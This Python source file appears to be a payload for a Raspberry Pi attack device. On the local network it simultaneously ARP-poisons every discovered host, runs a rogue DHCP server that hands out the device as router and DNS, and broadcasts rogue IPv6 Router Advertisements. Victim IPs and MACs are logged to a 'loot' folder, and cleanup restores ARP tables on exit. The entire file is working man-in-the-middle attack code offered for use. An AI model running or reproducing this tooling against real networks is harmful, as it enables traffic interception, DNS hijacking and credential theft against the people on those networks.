#!/usr/bin/env python3
"""
RaspyJack Payload -- Rogue Gateway
====================================
Author: 7h30th3r0n3

Multi-vector gateway takeover combining ARP poisoning, rogue DHCP,
and IPv6 Router Advertisement simultaneously.  All three vectors
run in parallel threads for maximum coverage.

Vectors:
  ARP   -- Poison target ARP cache for gateway
  DHCP  -- Rogue DHCP server with Pi as gateway (on lease expiry)
  RA    -- IPv6 Router Advertisements with Pi as IPv6 gateway

Controls:
  OK         -- Start / Stop all vectors
  KEY1       -- Toggle individual vectors (ARP/DHCP/RA)
  UP / DOWN  -- Scroll victim list
  KEY3       -- Exit + full cleanup (restore ARP, stop DHCP, stop RA)

Setup: Best with 2 interfaces.  Uses scapy for all vectors.
"""

import os
import sys
import time
import json
import random
import struct
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, ARP, IP, UDP, BOOTP, DHCP, IPv6, Raw,
        ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptRDNSS, ICMPv6NDOptMTU,
        sendp, send, sniff as scapy_sniff, conf, get_if_hwaddr,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/RogueGateway"
os.makedirs(LOOT_DIR, exist_ok=True)

ROWS_VISIBLE = 4
ARP_INTERVAL = 2
DHCP_LEASE_TIME = 300
RA_INTERVAL = 10

VECTOR_NAMES = ["ARP", "DHCP", "RA"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
attacking = False

# Vector toggles
vector_enabled = {"ARP": True, "DHCP": True, "RA": True}
vector_toggle_idx = 0   # which vector KEY1 toggles

# Victim tracking
arp_victims = []         # list of IPs
dhcp_victims = []        # list of {"ip", "mac", "ts"}
ra_victims_count = 0
total_traffic = 0

# Network info
my_iface = "eth0"
my_ip = "0.0.0.0"
my_mac = ""
my_ipv6 = ""
gateway_ip = ""
gateway_mac = ""
subnet = ""

scroll_pos = 0
status_msg = "Ready"

_arp_thread = None
_dhcp_thread = None
_ra_thread = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run_cmd(cmd, timeout=10):
    """Run command and return result."""
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _run_silent(cmd, timeout=5):
    """Run command ignoring errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = _run_cmd(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_gateway_ip():
    """Get default gateway IP."""
    try:
        result = _run_cmd(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "0.0.0.0"


def _get_iface_mac(iface):
    """Read MAC of our interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _get_ipv6_link_local(iface):
    """Get link-local IPv6 address of interface."""
    try:
        result = _run_cmd(["ip", "-6", "addr", "show", "dev", iface, "scope", "link"])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet6 "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "fe80::1"


def _get_subnet(iface):
    """Get subnet in CIDR notation for the interface."""
    try:
        result = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1]
    except Exception:
        pass
    return ""


def _resolve_mac(ip):
    """Resolve IP to MAC."""
    try:
        result = _run_cmd(["arp", "-n", ip])
        match = re.search(r"([0-9a-f:]{17})", result.stdout, re.I)
        if match:
            return match.group(1).lower()
    except Exception:
        pass
    try:
        result = _run_cmd(["sudo", "arping", "-c", "1", "-I", my_iface, ip], timeout=5)
        match = re.search(r"\[([0-9a-f:]{17})\]", result.stdout, re.I)
        if match:
            return match.group(1).lower()
    except Exception:
        pass
    return ""


def _arp_scan_hosts():
    """Quick ARP scan to find hosts."""
    found = []
    try:
        result = _run_cmd(
            ["sudo", "arp-scan", "--interface", my_iface, subnet],
            timeout=30,
        )
        for line in result.stdout.splitlines():
            match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})", line, re.I)
            if match:
                ip = match.group(1)
                mac = match.group(2).lower()
                if ip != my_ip and ip != gateway_ip:
                    found.append({"ip": ip, "mac": mac})
    except Exception:
        pass
    return found


def _subnet_base():
    """Get /24 base from our IP."""
    parts = my_ip.split(".")
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2]}"
    return "192.168.1"


# ---------------------------------------------------------------------------
# Vector 1: ARP Poisoning
# ---------------------------------------------------------------------------

def _arp_poison_loop():
    """Continuously ARP poison discovered hosts."""
    global arp_victims

    # First scan for targets
    found = _arp_scan_hosts()
    with lock:
        arp_victims = [h["ip"] for h in found]

    while running and attacking and vector_enabled.get("ARP", False):
        with lock:
            targets = list(arp_victims)
            gw = gateway_ip
            gw_mac = gateway_mac
            mac = my_mac

        for target_ip_addr in targets:
            if not running or not attacking or not vector_enabled.get("ARP", False):
                break
            try:
                target_mac = _resolve_mac(target_ip_addr)
                if not target_mac:
                    continue
                # Tell target: gateway is at our MAC
                pkt1 = Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip_addr, hwdst=target_mac,
                    psrc=gw, hwsrc=mac,
                )
                # Tell gateway: target is at our MAC
                pkt2 = Ether(dst=gw_mac) / ARP(
                    op=2, pdst=gw, hwdst=gw_mac,
                    psrc=target_ip_addr, hwsrc=mac,
                )
                sendp([pkt1, pkt2], iface=my_iface, verbose=False)
            except Exception:
                pass

        for _ in range(ARP_INTERVAL * 10):
            if not running or not attacking:
                break
            time.sleep(0.1)


def _arp_restore():
    """Restore ARP tables for all victims."""
    with lock:
        targets = list(arp_victims)
        gw = gateway_ip
        gw_mac = gateway_mac

    for target_ip_addr in targets:
        try:
            target_mac = _resolve_mac(target_ip_addr)
            if not target_mac or not gw_mac:
                continue
            pkt1 = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip_addr, hwdst=target_mac,
                psrc=gw, hwsrc=gw_mac,
            )
            pkt2 = Ether(dst=gw_mac) / ARP(
                op=2, pdst=gw, hwdst=gw_mac,
                psrc=target_ip_addr, hwsrc=target_mac,
            )
            sendp([pkt1, pkt2], iface=my_iface, verbose=False, count=5)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Vector 2: Rogue DHCP
# ---------------------------------------------------------------------------

def _dhcp_server_loop():
    """Listen for DHCP Discover/Request and respond as rogue DHCP."""
    next_ip_octet = 100

    def _process_dhcp(pkt):
        nonlocal next_ip_octet
        if not running or not attacking or not vector_enabled.get("DHCP", False):
            return
        if not pkt.haslayer(DHCP):
            return

        dhcp_opts = dict(pkt[DHCP].options)
        msg_type = dhcp_opts.get("message-type")

        if msg_type not in (1, 3):  # Discover=1, Request=3
            return

        client_mac = pkt[Ether].src
        base = _subnet_base()

        if msg_type == 1:
            # Respond with DHCP Offer
            offered_ip = f"{base}.{next_ip_octet}"
            next_ip_octet = (next_ip_octet % 150) + 100

            try:
                reply = (
                    Ether(src=my_mac, dst=client_mac)
                    / IP(src=my_ip, dst="255.255.255.255")
                    / UDP(sport=67, dport=68)
                    / BOOTP(
                        op=2, yiaddr=offered_ip,
                        siaddr=my_ip, giaddr="0.0.0.0",
                        chaddr=bytes.fromhex(client_mac.replace(":", "")),
                        xid=pkt[BOOTP].xid,
                    )
                    / DHCP(options=[
                        ("message-type", "offer"),
                        ("server_id", my_ip),
                        ("lease_time", DHCP_LEASE_TIME),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", my_ip),
                        ("name_server", my_ip),
                        "end",
                    ])
                )
                sendp(reply, iface=my_iface, verbose=False)
            except Exception:
                pass

        elif msg_type == 3:
            # Respond with DHCP ACK
            requested_ip = dhcp_opts.get("requested_addr", "0.0.0.0")
            if isinstance(requested_ip, bytes):
                requested_ip = ".".join(str(b) for b in requested_ip)

            try:
                reply = (
                    Ether(src=my_mac, dst=client_mac)
                    / IP(src=my_ip, dst="255.255.255.255")
                    / UDP(sport=67, dport=68)
                    / BOOTP(
                        op=2, yiaddr=requested_ip,
                        siaddr=my_ip, giaddr="0.0.0.0",
                        chaddr=bytes.fromhex(client_mac.replace(":", "")),
                        xid=pkt[BOOTP].xid,
                    )
                    / DHCP(options=[
                        ("message-type", "ack"),
                        ("server_id", my_ip),
                        ("lease_time", DHCP_LEASE_TIME),
                        ("subnet_mask", "255.255.255.0"),
                        ("router", my_ip),
                        ("name_server", my_ip),
                        "end",
                    ])
                )
                sendp(reply, iface=my_iface, verbose=False)

                victim = {
                    "ip": requested_ip,
                    "mac": client_mac,
                    "ts": datetime.now().strftime("%H:%M:%S"),
                }
                with lock:
                    # Update or add
                    found = False
                    for i, v in enumerate(dhcp_victims):
                        if v["mac"] == client_mac:
                            dhcp_victims[i] = victim
                            found = True
                            break
                    if not found:
                        dhcp_victims.append(victim)
            except Exception:
                pass

    try:
        scapy_sniff(
            iface=my_iface,
            filter="udp and (port 67 or port 68)",
            prn=_process_dhcp,
            store=False,
            stop_filter=lambda _: not running or not attacking or not vector_enabled.get("DHCP", False),
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Vector 3: IPv6 Router Advertisement
# ---------------------------------------------------------------------------

def _ra_loop():
    """Periodically send IPv6 Router Advertisements."""
    global ra_victims_count

    while running and attacking and vector_enabled.get("RA", False):
        try:
            ra_pkt = (
                IPv6(src=my_ipv6, dst="ff02::1")
                / ICMPv6ND_RA(
                    chlim=64,
                    M=0, O=1,      # Other config via DHCPv6
                    routerlifetime=1800,
                    reachabletime=0,
                    retranstimer=0,
                )
                / ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
                / ICMPv6NDOptPrefixInfo(
                    prefixlen=64,
                    L=1, A=1,
                    validlifetime=2592000,
                    preferredlifetime=604800,
                    prefix="fd00:dead:beef::",
                )
                / ICMPv6NDOptMTU(mtu=1500)
            )

            # Add RDNSS option (Pi as DNS)
            try:
                ra_pkt = ra_pkt / ICMPv6NDOptRDNSS(
                    lifetime=1800,
                    dns=[my_ipv6],
                )
            except Exception:
                pass

            send(ra_pkt, iface=my_iface, verbose=False)
            with lock:
                ra_victims_count += 1

        except Exception:
            pass

        for _ in range(RA_INTERVAL * 10):
            if not running or not attacking or not vector_enabled.get("RA", False):
                break
            time.sleep(0.1)


# ---------------------------------------------------------------------------
# Start / Stop all vectors
# ---------------------------------------------------------------------------

def _start_all():
    """Start all enabled vectors."""
    global attacking, _arp_thread, _dhcp_thread, _ra_thread

    # Enable IP forwarding
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    _run_silent(["sudo", "sysctl", "-w", "net.ipv6.conf.all.forwarding=1"])

    with lock:
        attacking = True

    if vector_enabled.get("ARP", False):
        _arp_thread = threading.Thread(target=_arp_poison_loop, daemon=True)
        _arp_thread.start()

    if vector_enabled.get("DHCP", False):
        _dhcp_thread = threading.Thread(target=_dhcp_server_loop, daemon=True)
        _dhcp_thread.start()

    if vector_enabled.get("RA", False):
        _ra_thread = threading.Thread(target=_ra_loop, daemon=True)
        _ra_thread.start()


def _stop_all():
    """Stop all vectors and clean up."""
    global attacking

    with lock:
        attacking = False

    # Wait for threads to wind down
    time.sleep(1)

    # Restore ARP
    try:
        _arp_restore()
    except Exception:
        pass

    # Disable forwarding
    _run_silent(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
    _run_silent(["sudo", "sysctl", "-w", "net.ipv6.conf.all.forwarding=0"])

    # Flush iptables
    _run_silent(["sudo", "iptables", "-t", "nat", "-F"])
    _run_silent(["sudo", "ip6tables", "-t", "nat", "-F"])


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export victim data to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "vectors_enabled": dict(vector_enabled),
            "arp_victims": list(arp_victims),
            "dhcp_victims": [dict(v) for v in dhcp_victims],
            "ra_advertisements": ra_victims_count,
            "gateway_ip": gateway_ip,
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"rogue_gw_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "ROGUE GATEWAY", fill="RED", font=font)

    with lock:
        st = status_msg
        atk = attacking
        sp = scroll_pos
        ve = dict(vector_enabled)
        vti = vector_toggle_idx
        a_victims = list(arp_victims)
        d_victims = list(dhcp_victims)
        ra_count = ra_victims_count

    atk_label = "ACTIVE" if atk else "IDLE"
    atk_color = "GREEN" if atk else "GRAY"
    draw.text((80, 2), atk_label, fill=atk_color, font=font)

    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    # Vector status
    y = 28
    for vname in VECTOR_NAMES:
        enabled = ve.get(vname, False)
        color = "GREEN" if enabled else "RED"
        marker = ">" if VECTOR_NAMES[vti] == vname else " "

        if vname == "ARP":
            count = len(a_victims)
        elif vname == "DHCP":
            count = len(d_victims)
        else:
            count = ra_count

        line = f"{marker}{vname}: {'ON' if enabled else 'OFF'} ({count})"
        draw.text((2, y), line, fill=color, font=font)
        y += 14

    # Combined victim list
    y = 72
    all_victims = []
    for ip in a_victims:
        all_victims.append(f"A:{ip}")
    for v in d_victims:
        all_victims.append(f"D:{v['ip']}")

    # Deduplicate
    seen = set()
    unique_victims = []
    for entry in all_victims:
        if entry not in seen:
            seen.add(entry)
            unique_victims.append(entry)

    visible = unique_victims[sp:sp + ROWS_VISIBLE]
    for entry in visible:
        draw.text((2, y), entry[:22], fill="WHITE", font=font)
        y += 12

    if not visible and atk:
        draw.text((2, 76), "Scanning targets...", fill="GRAY", font=font)

    # Footer
    if atk:
        draw.text((2, 116), "OK:Stop K1:Vec K3:Quit", fill="GRAY", font=font)
    else:
        draw.text((2, 116), "OK:Start K1:Vec K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, attacking, scroll_pos, status_msg, vector_toggle_idx
    global my_iface, my_ip, my_mac, my_ipv6, gateway_ip, gateway_mac, subnet

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        my_iface = _get_default_iface()
        my_ip = _get_iface_ip(my_iface)
        my_mac = _get_iface_mac(my_iface)
        my_ipv6 = _get_ipv6_link_local(my_iface)
        gateway_ip = _get_gateway_ip()
        gateway_mac = _resolve_mac(gateway_ip) if gateway_ip else ""
        subnet = _get_subnet(my_iface)

        with lock:
            status_msg = f"GW:{gateway_ip} on {my_iface}"

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                if not attacking:
                    with lock:
                        status_msg = "Starting all vectors..."
                    threading.Thread(target=_start_all, daemon=True).start()
                else:
                    with lock:
                        status_msg = "Stopping + cleanup..."
                    threading.Thread(target=_stop_all, daemon=True).start()
                time.sleep(0.5)

            elif btn == "KEY1":
                with lock:
                    vname = VECTOR_NAMES[vector_toggle_idx]
                    vector_enabled[vname] = not vector_enabled[vname]
                    vector_toggle_idx = (vector_toggle_idx + 1) % len(VECTOR_NAMES)
                    status_msg = f"{vname}: {'ON' if vector_enabled[vname] else 'OFF'}"
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    total_victims = len(arp_victims) + len(dhcp_victims)
                    max_s = max(0, total_victims - ROWS_VISIBLE)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False

        if attacking:
            _stop_all()

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 44), "Rogue GW stopped", fill="YELLOW", font=font)
            draw.text((10, 58), "ARP restored", fill="GREEN", font=font)
            draw.text((10, 72), "Cleanup done", fill="WHITE", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
